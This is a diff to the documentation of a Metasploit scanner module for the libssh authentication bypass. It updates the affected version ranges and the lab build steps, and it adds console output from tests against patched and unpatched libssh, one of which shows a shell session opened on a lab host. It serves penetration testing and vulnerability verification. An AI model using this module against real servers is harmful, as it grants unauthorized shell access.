@@ -2,7 +2,8 @@
 
 This module exploits an authentication bypass in libssh server code
 where a `USERAUTH_SUCCESS` message is sent in place of the expected
-`USERAUTH_REQUEST` message. Versions 0.6 and later are affected.
+`USERAUTH_REQUEST` message. libssh versions 0.6.0 through 0.7.5 and
+0.8.0 through 0.8.3 are vulnerable.
 
 Note that this module's success depends on whether the server code
 can trigger the correct (`shell`/`exec`) callbacks despite only the state
@@ -15,7 +16,7 @@ additional code paths to be followed.
 
 1. `git clone git://git.libssh.org/projects/libssh.git`
 2. `cd libssh` and `git checkout libssh-0.8.3`
-3. `patch -p0 < /path/to/metasploit-framework/external/source/libssh/ssh_server_fork.patch`
+3. `git apply -p1 /path/to/metasploit-framework/external/source/libssh/ssh_server_fork.patch`
 4. Follow the steps in `INSTALL` to build libssh
 5. Run `build/examples/ssh_server_fork` (I like to `strace` it)
 
@@ -35,13 +36,13 @@ require this. Note that you WILL be logged in `utmp`, `wtmp`, and
 
 **CHECK_BANNER**
 
-This is a banner check for the `libssh` string. It's not sophisticated,
-and the banner may be changed, but it may prevent false positives due to
-how the OOB authentication packet always returns `true`.
+This is a banner check for libssh. It's not sophisticated, and the
+banner may be changed, but it may prevent false positives due to how the
+OOB authentication packet always returns `true`.
 
 ## Usage
 
-Testing against libssh 0.8.3:
+Positive testing against unpatched libssh 0.8.3:
 
 ```
 msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass
@@ -56,6 +57,7 @@ verbose => true
 msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
+[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
 [*] Command shell session 1 opened (172.28.128.1:56981 -> 172.28.128.3:2222) at 2018-10-19 12:38:24 -0500
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
@@ -74,12 +76,25 @@ tty
 #
 ```
 
+Negative testing against patched libssh 0.8.4:
+
+```
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+
+[*] 172.28.128.3:2222 - Attempting authentication bypass
+[-] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.4 appears to be patched
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
+```
+
 Negative testing against an insufficiently implemented libssh server:
 
 ```
 msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
 
 [*] 172.28.128.3:2222 - Attempting authentication bypass
+[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
 [-] 172.28.128.3:2222 - shell/exec channel request failed
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
